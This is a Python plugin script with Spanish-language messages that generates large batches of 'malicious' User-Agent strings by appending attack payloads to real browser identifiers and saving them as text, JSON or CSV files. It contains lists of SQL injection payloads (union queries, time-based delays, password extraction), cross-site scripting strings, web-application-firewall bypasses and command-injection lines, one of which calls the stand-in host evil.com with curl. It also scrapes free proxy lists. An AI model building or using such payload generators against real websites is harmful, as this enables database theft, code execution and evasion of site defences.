import sys
import os
import time
import random
import json
import csv
import gzip
import threading
import requests
import re
from datetime import datetime

def usage():
    print("Uso: ua -c 10 [txt|json|csv] [gzip] [all|sqli|xss|waf|rce]")
    print("Ejemplo: ua -c 1000 json gzip sqli")

def get_proxies():
    try:
        response = requests.get("https://free-proxy-list.net/", timeout=10)
        proxies = []
        for line in response.text.split("\n"):
            match = re.search(r'data-ip="(\d+\.\d+\.\d+\.\d+)"\s+data-port="(\d+)"', line)
            if match:
                proxies.append(f"{match.group(1)}:{match.group(2)}")
        return proxies[:10]
    except:
        return []

def fetch_external_user_agents():
    try:
        response = requests.get("https://user-agents.net/random", timeout=10)
        agents = re.findall(r'Mozilla/5.0.*?(?=<)', response.text)
        return agents[:100] if agents else []
    except:
        return []

def save_to_file(output_dir, name, content):
    print(f"\n=== {name} ===")
    print(content)
    file_path = os.path.join(output_dir, f"{name}.txt")
    with open(file_path, "w") as f:
        print(f"=== {name} ===", file=f)
        print(content, file=f)
    return file_path

def run(args):
    max_agents = 100000
    max_file_size = 30 * 1024 * 1024
    max_execution_time = 30
    
    count = 10
    output_format = 'txt'
    use_gzip = False
    payload_category = 'all'
    
    output_dir = "output"
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)
    
    print("[Ejecutando plugin: ua]")
    
    if len(args) < 1:
        usage()
        return
    
    if '-c' in args:
        try:
            count_index = args.index('-c') + 1
            if count_index >= len(args):
                print("Error: Debe especificar un número después de -c")
                return
            count = int(args[count_index])
            if count < 1 or count > max_agents:
                print(f"Error: La cantidad debe estar entre 1 y {max_agents}")
                return
        except ValueError:
            print("Error: La cantidad debe ser un número válido")
            return
    
    if 'json' in args:
        output_format = 'json'
    elif 'csv' in args:
        output_format = 'csv'
    elif 'txt' in args:
        output_format = 'txt'
    
    use_gzip = 'gzip' in args
    
    for cat in ['sqli', 'xss', 'waf', 'rce']:
        if cat in args:
            payload_category = cat
            break
    
    print("Obteniendo proxies...")
    proxies = get_proxies()
    print(f"Proxies disponibles: {len(proxies)}")
    if proxies:
        save_to_file(output_dir, "proxies", "\n".join(proxies))
    
    base_user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Android 13; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0",
        "Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8",
        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
        "Mozilla/5.0 (iPad; CPU OS 12_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/118.0.2088.46",
        "Mozilla/5.0 (Android 12; Mobile; LG-M255; rv:102.0) Gecko/102.0 Firefox/102.0"
    ]
    
    print("Obteniendo user agents externos...")
    external_agents = fetch_external_user_agents()
    if external_agents:
        base_user_agents.extend(external_agents)
        print(f"Agregados {len(external_agents)} user agents externos")
    
    payloads = {
        "sqli": [
            "') OR CHAR(102)||CHAR(117)||CHAR(120)||CHAR(97)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)-- utPM",
            "' OR CHAR(102)||CHAR(117)||CHAR(120)||CHAR(97)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)-- GGPU",
            ")) OR CHAR(102)||CHAR(117)||CHAR(120)||CHAR(97)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) AND ((2361=2361",
            "' OR 1=1--",
            "') UNION SELECT NULL,@@version,@@hostname--",
            "' AND IF(1=1,SLEEP(5),0)--",
            "') OR EXISTS(SELECT * FROM information_schema.tables WHERE table_schema=database())--",
            "' OR (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='a'--",
            "') AND (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END)--",
            "' OR 1=CONVERT(int,(SELECT @@version))--",
            "') UNION ALL SELECT NULL,version(),database()--",
            "') OR EXISTS(SELECT * FROM information_schema.tables WHERE table_schema=database())--",
            "') AND (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END)--",
            "') UNION ALL SELECT NULL,version(),database()--"
        ],
        "xss": [
            "');alert('XSS')//",
            "');<script>alert('XSS')</script>;//",
            "');document.write('<img src=x onerror=alert(1)>');//",
            "');<svg onload=alert('XSS')>",
            "');prompt('XSS')//",
            "');eval('alert(1)')//",
            "');<iframe src=javascript:alert('XSS')>",
            "');document.location='javascript:alert(1)'//",
            "');<script>alert('XSS')</script>;//",
            "');document.write('<img src=x onerror=alert(1)>');//",
            "');<iframe src=javascript:alert('XSS')>"
        ],
        "waf": [
            "'/**/OR/**/1=1--",
            "' OR '1'='1' #",
            "') OR (SELECT 1 FROM dual WHERE 1=1)--",
            "' OR 'a'='a' UNION SELECT NULL,@@version--",
            "'%3B SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE 0 END--",
            "' OR 1=1/*comment*/--",
            "' UNION /*bypass*/ SELECT NULL,@@version--",
            "' OR '1'='1'--%0A"
        ],
        "rce": [
            "');exec('whoami')--",
            "');system('id')--",
            "');<?php system('whoami');?>//",
            "');eval('system(\"id\")')--",
            "');`whoami`--",
            "');$(whoami)//",
            "');exec('curl http://evil.com')--",
            "');passthru('id')--"
            #"');eval('system("id")')--"
        ]
    }
    
    def generate_malicious_user_agents(count, category):
        selected_payloads = payloads[category] if category != "all" else [p for cat in payloads.values() for p in cat]
        user_agents = set()
        start_time = time.time()
        
        while len(user_agents) < count and (time.time() - start_time) < max_execution_time:
            base_agent = random.choice(base_user_agents)
            payload = random.choice(selected_payloads)
            user_agent = f"{base_agent}{payload}"
            
            if len(user_agent.encode()) <= 1024:
                user_agents.add(user_agent)
        
        return list(user_agents)[:count]
    
    print(f"Generando {count} User-Agents en formato {output_format}{' con compresión gzip' if use_gzip else ''}...")
    print(f"Categoría de payload: {payload_category}")
    
    start_time = time.time()
    
    user_agents = []
    lock = threading.Lock()
    
    def generate_chunk(chunk_size, category):
        chunk = generate_malicious_user_agents(chunk_size, category)
        with lock:
            user_agents.extend(chunk)
    
    threads = []
    chunk_size = max(1, count // 4)
    remaining = count
    
    for i in range(4):
        current_chunk = min(chunk_size, remaining)
        if current_chunk <= 0:
            break
        t = threading.Thread(target=generate_chunk, args=(current_chunk, payload_category))
        threads.append(t)
        t.start()
        remaining -= current_chunk
    
    for t in threads:
        t.join()
    
    user_agents = user_agents[:count]
    
    if not user_agents:
        print("Error: No se pudieron generar User-Agents.")
        return
    
    execution_time = time.time() - start_time
    if execution_time > max_execution_time:
        print(f"Advertencia: Tiempo de generación excedido ({execution_time:.2f} segundos).")
    
    file_name = f"ua.{output_format}{'.gz' if use_gzip else ''}"
    file_path = os.path.join(output_dir, file_name)
    
    try:
        if output_format == 'json':
            json_data = {"user_agents": user_agents, "count": len(user_agents), "category": payload_category}
            json_string = json.dumps(json_data, indent=2)
            
            if len(json_string.encode()) > max_file_size:
                print(f"Error: El archivo JSON excede el límite de 30 MB.")
                return
            
            if use_gzip:
                with gzip.open(file_path, 'wt', encoding='utf-8') as f:
                    f.write(json_string)
            else:
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write(json_string)
                    
        elif output_format == 'csv':
            if use_gzip:
                with gzip.open(file_path, 'wt', newline='', encoding='utf-8') as f:
                    writer = csv.writer(f)
                    writer.writerow(["User-Agent"])
                    for ua in user_agents:
                        writer.writerow([ua])
            else:
                with open(file_path, 'w', newline='', encoding='utf-8') as f:
                    writer = csv.writer(f)
                    writer.writerow(["User-Agent"])
                    for ua in user_agents:
                        writer.writerow([ua])
                        
        else:
            if use_gzip:
                with gzip.open(file_path, 'wt', encoding='utf-8') as f:
                    for ua in user_agents:
                        f.write(f"{ua}\n")
            else:
                with open(file_path, 'w', encoding='utf-8') as f:
                    for ua in user_agents:
                        f.write(f"{ua}\n")
        
        print(f"Completado: {len(user_agents)} User-Agents generados en {file_name}")
        print(f"Tiempo de ejecución: {execution_time:.2f} segundos")
        
        summary_content = f"""Generados: {len(user_agents)} User-Agents
Formato: {output_format}
Compresión: {'gzip' if use_gzip else 'ninguna'}
Categoría: {payload_category}
Tiempo de ejecución: {execution_time:.2f} segundos
Guardado en: {file_path}"""
        
        save_to_file(output_dir, "summary", summary_content)
        
        json_summary_path = os.path.join(output_dir, "metadata.json")
        metadata = {
            "count": len(user_agents),
            "output_format": output_format,
            "use_gzip": use_gzip,
            "payload_category": payload_category,
            "start_time": datetime.fromtimestamp(start_time).isoformat(),
            "end_time": datetime.now().isoformat(),
            "execution_time": execution_time,
            "generated_count": len(user_agents),
            "file_path": file_path,
            "proxies_found": len(proxies)
        }
        
        with open(json_summary_path, 'w') as f:
            json.dump(metadata, f, indent=2)
        
        print(f"Archivos guardados en {output_dir}/")
        
    except Exception as e:
        print(f"Error al guardar archivo: {str(e)}")
        return

if __name__ == "__main__":
    test_args = ["-c", "50", "json", "sqli"]
    run(test_args)
